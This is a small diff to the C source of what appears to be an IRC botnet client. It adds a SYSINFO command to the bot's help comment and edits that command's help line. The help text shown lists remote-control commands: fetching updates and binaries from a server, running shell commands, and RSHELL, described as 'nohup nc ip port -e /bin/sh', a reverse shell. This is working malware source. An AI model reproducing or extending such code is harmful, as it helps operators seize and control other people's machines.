@@ -65,6 +65,7 @@
  *       UPDATE <http://server/bot>    = Update this bot                       *
  *       HACKPKG <http://server/bin>   = Install binary (no dependencies)      *
  *       RSHELL <ip port>              = Equates to nohup nc ip port           *
+ *       SYSINFO                       = Get system information                *
  * Remember, all these commands must be prefixed by a ! and the nickname that  *
  * you want the command to be sent to (can include wildcards). There are no    *
  * spaces in between the ! and the nickname, and there are no spaces before    *
@@ -1273,7 +1274,7 @@ void help(int sock, char *sender, int argc, char **argv) {
 	Send(sock,"NOTICE %s :ISH <command>                                    = SH, interactive, sends to channel\n",sender); sleep(1);
 	Send(sock,"NOTICE %s :SHD <command>                                    = Executes a daemonized command\n",sender); sleep(1);
 	Send(sock,"NOTICE %s :BASH <cmd>                                       = Execute commands using bash (if present). \n",sender); sleep(1);
-	Send(sock,"NOTICE %s :SYSINFO 0                                        = Print env,users, useful programs, uptime, etc. \n",sender); sleep(1);
+	Send(sock,"NOTICE %s :SYSINFO                                          = Print env,users, useful programs, uptime, etc. \n",sender); sleep(1);
 	Send(sock,"NOTICE %s :RSHELL <server> <port>                           = Equates to nohup nc ip port -e /bin/sh\n",sender); sleep(1);
 	exit(0);
 }
